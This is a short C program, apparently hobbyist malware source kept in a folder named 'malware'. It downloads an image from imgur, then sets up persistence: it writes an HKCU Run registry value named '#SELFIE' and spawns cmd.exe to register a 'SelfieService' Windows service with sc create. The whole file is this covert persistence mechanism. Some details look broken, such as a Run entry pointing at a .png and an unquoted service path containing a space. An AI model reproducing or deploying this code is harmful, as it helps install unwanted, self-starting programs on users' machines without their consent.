#include <curl/curl.h>

#pragma comment(lib, "advapi32.lib")
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>


char szRunKey[] = {"Software\\Microsoft\\Windows\\CurrentVersion\\Run"};
char szMyAppPath[] = {"D:\\cygwin64\\home\\Alex Barutt\\malware\\page.png"};
char szMyappSubKey[] = {"#SELFIE"};

void downloadimage()
{
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char *url = "http://i.imgur.com/HTXMZEw.png";
    char outfilename[FILENAME_MAX] = "selfiee.png";
    curl = curl_easy_init();                                                                                                                                                                                                                                                           
    if (curl)
    {   
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
    }   
}

void changeReg()
{
    HKEY hKey;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, szRunKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        if(RegSetValueEx(hKey, szMyappSubKey, 0,
                REG_SZ, (const unsigned char*)szMyAppPath,
                sizeof(szMyAppPath)) == ERROR_SUCCESS)
            puts("Create Run key successful");
        else
            puts("RegSetValueEx failed");

        RegCloseKey(hKey);
    }
    else
        puts("RegOpenKeyEx key failed");
}

void ServiceRegister()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
 
    CreateProcess(NULL, "cmd.exe /C sc create SelfieService binPath= d:\\cygwin64\\home\\Alex Barutt\\malware\\reggy.exe displayname= SELFIESERVICE", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(void)
{
    downloadimage();
    changeReg();
    ServiceRegister();
    return 0;
}